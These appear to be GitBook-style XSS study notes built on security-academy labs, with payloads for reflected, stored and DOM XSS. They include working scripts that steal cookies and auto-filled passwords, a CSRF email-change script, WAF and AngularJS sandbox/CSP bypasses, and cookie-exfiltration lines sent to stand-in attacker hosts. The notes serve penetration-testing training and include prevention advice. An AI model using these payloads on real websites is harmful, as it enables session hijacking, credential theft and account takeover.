# Cross site scripting (XSS)

* This vulnerability allows an attacker to compromise user interactions with a vulnerable application.
* It can circumvent the same-origin policy.
* Websites won't be segregated from each other if they are vulnerable.
* An attacker can masquerade as a victim user to perform actions and access user data.
* Privilege escalation (vertical and horizontal) is possible.
* Full control over application functionality and data may be achieved.

What XSS does

* Manipulates a vulnerable website to return malicious JavaScript to users.
* Executing malicious code inside a victim's browser can fully compromise the interaction with the application.

How to prove XSS (PoC)

* Inject a payload that causes your browser to execute arbitrary JavaScript.
* Use `alert()` as a simple proof-of-concept:
  * Short, harmless, hard to miss.
  * Note: Some browsers (e.g., Chrome V92 behavior) may block cross-origin `alert()` in certain contexts; `print()` or other benign functions can be alternatives.

Types of XSS

* Reflected XSS — malicious script comes from the current HTTP request.
* Stored XSS — malicious script comes from website storage (database).
* DOM-based XSS — vulnerability exists in client-side code rather than server-side.

Reflected XSS (example)

* If an application reflects a query parameter without processing:
  *   Safe:

      ```
      https://insecure-website.com/status?message=All+is+well.
      <p>Status: All is well.</p>
      ```
  *   Vulnerable:

      ```
      https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
      <p>Status: <script>/* Bad stuff here... */</script></p>
      ```
* When the constructed URL is clicked, the script runs in the user's browser and can use the user's session to perform actions or retrieve data.

Exploiting XSS — common PoC

* `alert()` is commonly used to prove arbitrary JS execution on a domain.
* `alert(document.domain)` shows the domain where the JS executes.
* Real threats require full exploits (cookie exfiltration, CSRF, credential capture, etc.).

## Labs and practical examples

For each lab below the steps are presented as a stepper (Introduction → Vulnerability → Payload & End-goal → Reconnaissance → Attack → Exploit/Enumeration → Remarks).

{% stepper %}
{% step %}
### Lab: Reflected XSS into HTML context with nothing encoded (Reflected PoC)

#### Lab - Introduction

Web\_Pentest701: Pen-tester looks for a search functionality.

#### Vulnerability - Problem

Search input is reflected into output without encoding.

#### Payload & End-goal

Get the payload out in a script that calls a function in the application. Payloads: `alert()`, `print()`.

#### Reconnaissance-Plan

Check the search function parameter, e.g.: `https://hamcodes.net/?search=` Proxy and inspect how input is stored/reflected (e.g., `<h1>0 search results for 'ham'</h1>`).

#### Attack

Inject `<script>alert(1)</script>` via the search parameter.

#### Exploit & Enumerate

Send the GET request and observe the function executes in the victim browser.

#### Remarks

Proof-of-concept; confirm with `alert()` / `print()`.
{% endstep %}

{% step %}
### Lab: Exploiting XSS to steal cookies (Stored XSS example)

#### Lab - Introduction

Web\_Pentest702: Find a blog comments function.

#### Vulnerability - Problem

Victim views comments that may execute injected JS.

#### Payload & End-goal

Exploit to steal victim session cookie and impersonate them.

#### Reconnaissance-Plan

Confirm JS execution via comment (e.g., `<script>alert(ham)</script>`). Inspect request used to post comment (`POST /post/comment`) and locate CSRF token (`document.getElementsByName('csrf')[0].value`) and `document.cookie`.

#### Attack

Post payload in comments so that when victim views the post, JS posts their cookie as a comment (or sends it to attacker).

#### Exploit & Enumerate

* Observe the displayed comment containing the session ID like `session=hZ0PnryR4...`
* Replace session cookie in your browser and access the account.

#### Payload (example)

```javascript
<script>
window.addEventListener('DOMContentLoaded', function() {
  var token = document.getElementsByName('csrf')[0].value
  var data = new FormData();
  data.append('csrf', token);
  data.append('postId', 8);
  data.append('comment', document.cookie);
  data.append('name', 'victim');
  data.append('email', 'blah@email.com');
  data.append('website', 'http://blah.com');

  fetch('/post/comment', {
      method: 'POST',
      mode: 'no-cors',
      body: data
  });
});
</script>
```

#### Stages

1. Run arbitrary JS via XSS.
2. Post a blog comment on behalf of victim containing the cookie.
3. Use the session value to hijack the session.
{% endstep %}

{% step %}
### Lab: Exploiting XSS to capture passwords (auto-fill)

#### Lab - Introduction

Web\_Pentest703: Find a blog comments function.

#### Vulnerability - Problem

Browser auto-fill will populate username/password fields when present.

#### Payload & End-goal

Exfiltrate victim username and password when their browser auto-fills the inputs.

#### Reconnaissance-Plan

Check if comment section accepts HTML/JS (`<script>alert(1)</script>`). Create two input fields and cause browser auto-fill to populate them.

#### Attack

Inject fields and JS into comment:

* `<input type="text" name="username">`
* `<input type="password" name="password" onchange="dothis()">`
* JS captures values and posts them back as a comment.

#### Exploit & Enumerate

Return to the comment section to see captured credentials and use them to log in as admin.

#### Payload (example)

```javascript
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
function dothis() {
  var username = document.getElementsByName('username')[0].value
  var password = document.getElementsByName('password')[0].value
  var token = document.getElementsByName('csrf')[0].value
  var data = new FormData();

  data.append('csrf', token);
  data.append('postId', 8); // Change '8' to correct postId
  data.append('comment', `${username}:${password}`);
  data.append('name', 'victim');
  data.append('email', 'blah@email.com');
  data.append('website', 'http://blah.com');

  fetch('/post/comment', {
      method: 'POST',
      mode: 'no-cors',
      body: data
  });
};
</script>
```

Notes:

* Change `postId` accordingly.
{% endstep %}

{% step %}
### Lab: Exploiting XSS to perform CSRF (change email)

#### Lab - Introduction

Web\_Pentest704: Find blog comments.

#### Vulnerability - Problem

Comments are reflected and can run JS. Target: change victim email without password reentry.

#### Payload & End-goal

Change email of someone viewing the blog post.

#### Reconnaissance-Plan

* Log in as test user (e.g., `wiener:peter`) and inspect email change flow.
* `/my-account` contains CSRF token in input named `csrf`.
* The exploit must load the account page, extract the token, then POST to `/my-account/change-email`.

#### Attack

Inject JS into comments that:

* Loads `/my-account`
* Extracts CSRF token using regex
* Sends POST to change email to attacker-controlled address.

#### Exploit & Enumerate

Script runs when a user visits the comment; their email changes to attacker-controlled address, then attacker triggers password reset to take over the account.

#### Payload (example)

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
{% endstep %}

{% step %}
### Lab: Reflected XSS into HTML context with nothing encoded (Shop search)

#### Lab - Introduction

Web\_Pentest705: Online shopping site search.

#### Vulnerability - Problem

Search term is reflected directly into HTML response with no sanitisation.

#### Payload & End-goal

Inject scripts into the webpage, e.g.: `https://shopnow.com/search?q=<script>alert(1)</script>`

#### Reconnaissance-Plan

Search and proxy the request; observe search term is reflected as HTML.

#### Attack

Send the crafted search URL to a victim.

#### Exploit & Enumerate

Victim clicks; the script runs in their browser.

#### Real-world example (cookie steal)

```javascript
<script>
var img = new Image();
img.src = "https://attacker-site.com/steal?cookie=" + document.cookie;
</script>
```

Possible impacts: data theft, phishing, defacement.
{% endstep %}

{% step %}
### Lab: Reflected XSS into HTML context with most tags/attributes blocked (WAF bypass)

#### Lab - Introduction

Web\_Pentest706: Online shop with WAF.

#### Vulnerability - Problem

WAF blocking common XSS vectors.

#### Payload & End-goal

Bypass WAF and call `print()` (or other allowed function).

#### Reconnaissance-Plan

Use Burp Intruder to enumerate which tags/attributes are blocked. Use lists from XssCheatSheet.

#### Attack

Find allowed event attribute (e.g., `onresize`) and construct a payload using `<body onresize=print()>`. Host payload on exploit server as an iframe to trigger `print()`.

#### Exploit & Enumerate

Deliver exploit via exploit server and send to victims.

Example exploit snippet:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
{% endstep %}

{% step %}
### Lab: Reflected XSS into HTML with custom tags allowed

#### Lab - Introduction

Web\_Pentest706: Social platform where custom tags (e.g., `<custom-tag>`) are allowed.

#### Vulnerability - Problem

Custom tags are not blocked; script and common tags may be blocked.

#### Payload & End-goal

Create a custom tag that triggers JavaScript (e.g., `alert(document.cookie)`) using a focus event.

#### Reconnaissance-Plan

Test that `<img>` and `<script>` are blocked but `<custom-tag>` is allowed.

#### Attack

Create tag with `onfocus` and `tabindex=1` to make it focusable and execute when navigated to via URL hash: Example injection (URL-encoded) uses a custom element with `onfocus=alert(document.cookie)` and `#x` to scroll to the element.

#### Exploit & Enumerate

Host on exploit server and deliver to victim; page focuses element and triggers the event.

Example payload:

```html
<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
```

Impacts: session hijacking, credential theft, phishing, malware distribution.
{% endstep %}

{% step %}
### Lab: Reflected XSS with SVG markup allowed

#### Lab - Introduction

Web\_Pentest708: Site allowing SVG elements.

#### Vulnerability - Problem

SVG tags/events allowed — attacker can use SVG event attributes.

#### Payload & End-goal

Trigger `alert()` via SVG event attribute, e.g.: `<svg><animatetransform onbegin=alert(1)>`.

#### Reconnaissance-Plan

Use Burp Intruder to identify allowed SVG tags and attributes (`<svg>`, `<animatetransform>`, `onbegin`, etc.).

#### Attack

Construct payload with `onbegin=alert(1)` and URL-encode it into the search parameter.

#### Exploit & Enumerate

When the page loads, browser interprets SVG and triggers `onbegin`, executing JS.

Example payload (URL-encoded): `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`
{% endstep %}

{% step %}
### Lab: Reflected XSS into attribute with angle brackets HTML-encoded (break out of quoted attribute)

#### Lab - Introduction

Web\_Pentest709: News site search — angle brackets encoded.

#### Vulnerability - Problem

User input reflected inside a quoted attribute (e.g., `value="..."`) — quotes not properly escaped, allowing breaking out of attribute and injecting event handlers.

#### Payload & End-goal

Inject an event handler that triggers on hover: `"onmouseover="alert(1)`

#### Reconnaissance-Plan

Search and inspect HTML source for quoted attribute reflection such as: `<input type="text" value="abcd1234">` Angle brackets are encoded (`<` → `&lt;`, `>` → `&gt;`) but quotes may not be properly handled.

#### Attack

Inject `"onmouseover="alert(1)` into the search value to close the attribute and add `onmouseover`.

#### Exploit & Enumerate

Resulting HTML example: `<input type="text" value="" onmouseover="alert(1)">` Hovering triggers alert.

Impact: information theft, phishing, wide-scale compromise.
{% endstep %}

{% step %}
### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

#### Lab - Introduction

Web\_Pentest709: Blog comments where author link is reflected into `<a href="...">`.

#### Vulnerability - Problem

User input stored in DB then reflected into an anchor `href` without proper sanitisation.

#### Payload & End-goal

Inject `javascript:` URL payload to run JS when clicking author name.

#### Reconnaissance-Plan

Post a comment and inspect how the input is reflected in the anchor.

#### Attack

Inject `<a href="javascript:alert(1)">Author Name</a>` or store `javascript:alert(1)` in the href-reflected input.

#### Exploit & Enumerate

Visit the blog and click the author name to execute the JS.

Impact: cookie theft, phishing, defacement.
{% endstep %}

{% step %}
### Lab: Reflected XSS in canonical link tag (accesskey + onclick)

#### Lab - Introduction

Web\_Pentest709: E-commerce home page includes a canonical `<link rel="canonical" href="...">`.

#### Vulnerability - Problem

User input reflected inside `href` allows injecting additional attributes like `accesskey` and `onclick`.

#### Payload & End-goal

Inject `'accesskey='x'onclick='alert(1)` into the URL (URL-encoded), resulting in: `<link rel="canonical" href="'accesskey='x'onclick='alert(1)">` Pressing the key combination triggers the `onclick`.

#### Reconnaissance-Plan

Confirm `href` is directly influenced by user input and that `accesskey` can be injected.

#### Attack

URL-encode and deliver the payload. Example: `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

#### Exploit & Enumerate

When the user presses `ALT+X` (or similar), the `onclick` triggers alert. Impact includes cookie theft, phishing, and account takeover.
{% endstep %}

{% step %}
### XSS into JavaScript contexts (breaking out of or strings)When user input is reflected inside a script block, an attacker can terminate the existing script or string and inject new HTML/JS:Example: `</script><img src=1 onerror=alert(document.domain)>`Browser first parses HTML, then executes scripts — this can allow closing existing script tags and inserting new ones.

#### Lab: Reflected XSS into a JavaScript string (single quote/backslash escaped)

1. Lab - Introduction: Web\_Pentest709 — search query tracked in JS string.
2. Vulnerability - Problem: Input reflected in `var searchQuery = 'abcd1234';`
3. Reconnaissance: Single quotes are escaped by the app (`test\'payload`), preventing simple breakout.
4. Attack: Close the existing `<script>` and inject a new `<script>alert(1)</script>`:
   * Example payload: `</script><script>alert(1)</script>`
5. Exploit: Submit payload and load resulting page to execute the injected script.
6. Impact: cookie theft, phishing, widespread compromise.

Real-world payload example:

```javascript
</script><script>fetch('https://malicious-site.com/steal?cookie=' + document.cookie)</script>
```
{% endstep %}

{% step %}
### Breaking out of JavaScript strings — various encodings and escape tricks

* Break out and repair script to avoid syntax errors. Examples:
  * `'-alert(document.domain)-'`
  * `';alert(document.domain)//`
* If the app escapes quotes/backslashes incorrectly, attacker can neutralise escaping using backslashes.

#### Lab: Reflected XSS into JS string with angle brackets HTML-encoded

* Angle brackets encoded but single quotes not escaped.
* Payload: `'-alert(1)-'` resulting in `var searchQuery = ''-alert(1)-'';` which executes alert.

#### Lab: Reflected XSS into JS string by escaping single quotes via backslash

* App escapes single quotes (`'` → `\'`) but fails to escape backslashes.
* Use a payload such as `\'-alert(1)//` to neutralise the escaping and break out:
  * Resulting reflected code triggers `alert(1)`.

Real-world examples:

```javascript
\'-alert(1)//
'\''fetch("https://malicious-site.com/steal?cookie=" + document.cookie)//
```
{% endstep %}

{% step %}
### Bypassing WAF using the `throw` statement and onerror handler

* Use `throw` with `onerror=alert` to trigger alert without using blocked characters.
* Example pattern: `onerror=alert;throw 1`

#### Lab: Reflected XSS in a JavaScript URL with some characters blocked

#### Lab - Introduction

Web\_Pentest710: Blogging platform where JS URLs in navigation are filtered.

#### Vulnerability - Problem

Certain characters blocked, but JS exception handling can be abused.

#### Payload & End-goal

Call `alert(1337)` using throw/onerror and comment-syntax `/**/` to avoid spaces.

#### Attack

Payload:

```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

URL-encoded version can be placed in the vulnerable `postId` parameter to trigger the payload when navigating back/forward actions occur.

#### Exploit & Enumerate

Place payload in URL and cause the vulnerable navigation to evaluate it; `alert(1337)` will execute.

Real-world impact: exfiltrate cookies by replacing `alert` with `fetch` or similar.
{% endstep %}

{% step %}
### XSS in JavaScript template literals

*   Template literals use backticks and `${...}` for embedded expressions:

    ```javascript
    document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
    ```
* If user-controlled input ends up inside a template literal, injecting `${...}` can execute code without terminating the literal.

#### Lab: Reflected XSS into a template literal (special chars Unicode-escaped)

#### Lab - Introduction

Web\_Pentest704: Forum with search results reflected into a JS template literal; app escapes special characters.

#### Vulnerability - Problem

Escapes angle brackets, quotes, backticks, backslashes — but `${...}` can still be injected.

#### Attack

Inject `${alert(1)}` into the template literal, resulting in: `var searchQuery =` ${alert(1)}`;` — the JS engine evaluates the expression and executes `alert(1)`.

#### Exploit & Enumerate

Replace search input with `${alert(1)}`, send request, load page, and observe execution.

Real-world impact: replace `alert` with `fetch('https://attacker.com/steal?cookie=' + document.cookie)`.
{% endstep %}

{% step %}
### XSS via client-side template injection (AngularJS sandbox escapes)

* Client-side template frameworks (e.g., AngularJS) can allow unsafe embedding of untrusted input into templates.
* If AngularJS sandbox is bypassable, arbitrary JS can be executed even if `$eval` and other functions are disabled.

#### Lab: Reflected XSS into AngularJS template (sandbox escape via prototype manipulation)

#### Lab - Introduction

Web\_Pentest704: E-commerce using AngularJS.

#### Vulnerability - Problem

AngularJS sandbox restricts powerful functions, but prototype manipulation may be possible.

#### Attack idea

* Override `String.prototype.charAt` to `[].join` (e.g., `toString().constructor.prototype.charAt = [].join;`).
* Use `toString().constructor.fromCharCode(...)` to generate strings without quotes and compose `x=alert(1)`.
* Use `orderBy` filter or other AngularJS filters to evaluate the produced expression.

Example payload (URL-encoded):

```
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

#### Exploit & Enumerate

Place payload in `search` parameter and load page; AngularJS processes the expression and executes `alert(1)`.

Real-world impact: cookie theft, account takeover. WAF may block direct payloads; creative encoding helps bypass.
{% endstep %}

{% step %}
### Lab: Reflected XSS with AngularJS sandbox escape and CSP bypass (ng-focus and orderBy)

#### Lab - Introduction

Web\_Pentest704: Online shop with AngularJS and a CSP.

#### Vulnerability - Problem

Sandbox + CSP in place, but AngularJS templating can be abused to run code via event handling and filters.

#### Attack idea

* Use `ng-focus` on an injected `<input>` element and `$event.composedPath()` to access `window`.
* Use `orderBy` to execute `(z=alert)(document.cookie)` (assign `alert` to variable `z` and execute with cookie argument).
* URL-encode payload and host it on the exploit server.

Example injection (URL-encoded):

```
<script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';</script>
```

#### Exploit & Enumerate

Deliver payload; when victim focuses the input (or page focuses it via `#x`), `alert(document.cookie)` executes, bypassing CSP and sandbox protections.

Real-world impact: session hijacking, data exfiltration.
{% endstep %}

{% step %}
### Stored XSS (general)

* Stored XSS occurs when an application stores untrusted data (comments, nicknames, contact info, network packet data, etc.) and includes it in responses in an unsafe way.
* Example: message board storing `<script>/* bad stuff */</script>` and rendering it to users unescaped.

#### Lab: Stored XSS into HTML context with nothing encoded

#### Lab - Introduction

Web\_Pentest704: Shopping site comment field persists input.

#### Vulnerability - Problem

Persistent XSS where stored inputs are reflected without encoding.

#### Payload & End-goal

Post `<script>alert(1)</script>` as a comment so other users executing the comment will run the script.

#### Reconnaissance-Plan / Attack / Exploit

* Post comment containing script.
* When other users view the post, the stored script executes.

Real-world exploitation may use `print()` to bypass `alert()` restrictions or use `<iframe>` hosting for more complex payloads.

Example iframe-hosted payload:

```html
<iframe src="https:example.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
{% endstep %}

{% step %}
### Exploiting XSS to steal cookies (summary lab)

#### Lab - Introduction

Web\_Pentest704: SocialSphere — comments allow injected JS.

#### Vulnerability - Problem

Comments are not sanitised, enabling JS that exfiltrates session cookies.

#### Payload & End-goal

Exfiltrate session cookie to attacker-controlled server using an image beacon.

#### Reconnaissance-Plan

Craft comment:

```javascript
<script>
  var img = new Image();
  img.src = 'https://attacker-server.com/steal?cookie=' + document.cookie;
</script>
```

#### Attack

Post the comment; when victim views it, the browser requests the attacker URL containing the cookie.

#### Exploit & Enumerate

Attacker collects the cookie (via Burp Collaborator or similar) and uses it to access the victim account.

Impact: account takeover, data theft, lateral spreading.
{% endstep %}

{% step %}
### HTML-encoding tricks (entities) to bypass filters

* If server-side filtering blocks characters (e.g., single quotes), HTML entities may be used since attributes are HTML-decoded before JS execution.
* Example: `&apos;-alert(document.domain)-&apos;` can decode to `' -alert(...) -'` inside a JS event handler.

#### Lab: Stored XSS into onclick event with many things encoded/escaped

#### Lab - Introduction

Web\_Pentest711: Blogging platform uses encoding/escaping but reflects input into `onclick`.

#### Vulnerability - Problem

`onclick` contains reflected input and server-side sanitisation is incomplete.

#### Attack

Use `&apos;` entity to break out of string inside `onclick` and insert `-alert(1)-`: `http://foo?&apos;-alert(1)-&apos;`

#### Exploit & Enumerate

When the author link is clicked, the `onclick` JS runs and `alert(1)` executes.

Prevention: context-aware output encoding, input sanitisation, CSP.
{% endstep %}

{% step %}
### Finding and testing for XSS

(Placeholders for processes and tools to use when hunting for XSS.)

* Inspect all places where user-controlled input is reflected (HTML content, attributes, script contexts, URLs, templates).
* Use a proxy (Burp Suite) and its Intruder/Repeater to test payloads and enumerate allowed tags/attributes.
* Try breaking out of contexts: HTML body, attributes, JS strings, template literals, and client-side templates (AngularJS, etc.).
* Test HTML-encoding/decoding behavior and backslash escaping behavior.
* Use benign PoC functions (`alert()`, `print()`) and then craft full exploits (cookie exfiltration, CSRF, credential capture) only in authorized testing environments.

Note: Always perform testing only on systems where you have explicit permission.
{% endstep %}
{% endstepper %}

## What can XSS be used for?

* Impersonate or masquerade as the victim user.
* Carry out any action that the user can perform.
* Read any data that the user can access.
* Capture the user's login credentials.
* Perform virtual defacement of the website.
* Inject trojan functionality into the website.

## Impact of XSS vulnerabilities

* Control script execution in a victim's browser.
* Perform actions on behalf of users.
* View and modify any information accessible to the victim user.
* Initiate interactions with other application users (social engineering, wormable XSS).

## Preventive measures (summary)

* Sanitize and validate user inputs.
* Use context-aware output encoding (HTML, attribute, JS, URL, CSS).
* Implement strong Content Security Policy (CSP).
* Use HttpOnly flag for session cookies where feasible.
* Ensure anti-CSRF tokens are used correctly and are not leaked.
* Avoid inserting untrusted data into sensitive contexts (script blocks, event handlers, template expressions).
* Test and harden client-side frameworks (AngularJS, template engines) against sandbox escapes.

## XSS CheatSheet

* XssCheatSheet: obsidian://open?vault=Obsidian%20Vault\&file=cheat-sheet.pdf

***

If you want, I can:

* Convert any specific lab into a standalone GitBook page (with the payloads in code blocks and stepper steps separated).
* Extract all PoC payloads into a single reference section.
* Produce a short remediation checklist suitable for developers.
